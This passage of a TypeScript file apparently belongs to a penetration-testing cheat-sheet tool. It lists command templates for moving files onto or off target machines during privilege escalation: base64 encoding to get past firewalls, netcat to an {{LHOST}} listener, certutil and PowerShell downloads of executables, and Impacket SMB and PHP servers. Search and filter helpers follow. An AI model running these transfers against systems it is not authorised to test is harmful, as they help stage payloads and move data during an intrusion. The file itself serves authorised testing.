    id: "pe-transfer-base64-encode",
    title: "Base64 Encode",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Encode file to base64 for transfer through firewalls",
    template: "base64 file.sh -w 0",
    tags: ["transfer", "base64", "encode", "linux"],
  },
  {
    id: "pe-transfer-base64-decode",
    title: "Base64 Decode",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Decode base64 string back to file on target",
    template: "echo '{{BASE64_STRING}}' | base64 -d > file.sh",
    tags: ["transfer", "base64", "decode", "linux"],
  },
  {
    id: "pe-transfer-nc",
    title: "Netcat Transfer",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Transfer file using netcat (receiver: nc -lvnp PORT > file)",
    template: "nc {{LHOST}} {{PORT}} < file.sh",
    tags: ["transfer", "netcat", "linux"],
  },
  {
    id: "pe-transfer-certutil",
    title: "Certutil (Windows)",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Download file on Windows using certutil",
    template: "certutil -urlcache -split -f http://{{LHOST}}:{{PORT}}/file.exe file.exe",
    tags: ["transfer", "certutil", "windows"],
  },
  {
    id: "pe-transfer-ps-download",
    title: "PowerShell Download",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Download file on Windows using PowerShell",
    template: "Invoke-WebRequest -Uri http://{{LHOST}}:{{PORT}}/file.exe -OutFile file.exe",
    tags: ["transfer", "powershell", "windows"],
    extraOptions: [
      { param: "-UseBasicParsing", description: "Skip DOM parsing" },
    ],
  },
  {
    id: "pe-transfer-smbserver",
    title: "SMB Server (Impacket)",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Start SMB server to share files with Windows targets",
    template: "impacket-smbserver share . -smb2support",
    tags: ["transfer", "smb", "impacket"],
    extraOptions: [
      { param: "-username user -password pass", description: "Add authentication" },
    ],
  },
  {
    id: "pe-transfer-php-server",
    title: "PHP HTTP Server",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Start PHP built-in server to serve files",
    template: "php -S 0.0.0.0:{{PORT}}",
    tags: ["transfer", "php", "http", "server"],
  },
];

export const getTemplatesByFilter = (
  category?: string,
  subcategory?: string,
  group?: string
): Template[] => {
  return templates.filter((t) => {
    if (category && t.category !== category) return false;
    if (subcategory && t.subcategory !== subcategory) return false;
    if (group && group && t.group !== group) return false;
    return true;
  });
};

export const searchTemplates = (query: string, templateList: Template[]): Template[] => {
  const lowerQuery = query.toLowerCase();
  return templateList.filter(
    (t) =>
      t.title.toLowerCase().includes(lowerQuery) ||
      t.description.toLowerCase().includes(lowerQuery) ||
      t.template.toLowerCase().includes(lowerQuery) ||
      t.tags.some((tag) => tag.toLowerCase().includes(lowerQuery))
  );
};

export const getAllTags = (): string[] => {
  const tagSet = new Set<string>();
  templates.forEach((t) => t.tags.forEach((tag) => tagSet.add(tag)));
  return Array.from(tagSet).sort();
};
